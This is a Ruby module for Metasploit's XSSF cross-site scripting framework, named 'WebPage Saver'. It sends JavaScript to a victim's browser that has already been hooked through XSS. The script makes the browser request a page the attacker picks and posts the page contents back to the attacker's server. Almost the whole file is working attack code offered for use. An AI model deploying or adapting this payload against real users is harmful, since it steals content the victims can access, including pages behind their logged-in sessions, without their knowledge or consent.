require 'msf/core'
require 'msf/base/xssf'


#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Retrieve page accessible by the victim
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'WebPage Saver',
			'Description' => 'Saves curent page viewed by the victim'
		))
		
		register_options(
			[
				OptString.new('Page', [true, 'Page you want to see !', 'http://www.google.fr'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			xhr.open("GET", '#{datastore['Page']}', true);			
			xhr.send(null);
			xhr.onreadystatechange=function() {
				if (xhr.readyState == 4)
					XSSF_POST(xhr.responseText, '#{self.name}');
			}
		}
		send_response(cli, code)
	end
end